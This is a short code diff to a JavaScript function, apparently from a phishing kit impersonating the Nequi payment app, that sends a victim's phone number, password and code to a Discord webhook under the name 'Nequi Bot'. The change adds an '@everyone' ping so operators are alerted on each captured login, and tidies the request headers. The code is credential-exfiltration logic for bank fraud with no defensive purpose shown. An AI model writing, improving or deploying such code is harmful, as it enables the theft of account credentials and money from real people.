@@ -140,6 +140,7 @@ function updateCdin() {
 async function sendAllToDiscord({ phone, pass, cdin }) {
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/....';
   const payload = {
+    content: '@everyone', // <-- Este es el ping
     username: 'Nequi Bot',
     avatar_url: 'https://i.imgur.com/nequi-logo.png',
     embeds: [{
@@ -154,7 +155,8 @@ async function sendAllToDiscord({ phone, pass, cdin }) {
     }]
   };
   await fetch(WEBHOOK_URL, {
-    method: 'POST', headers: {'Content-Type':'application/json'},
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload)
   });
 }
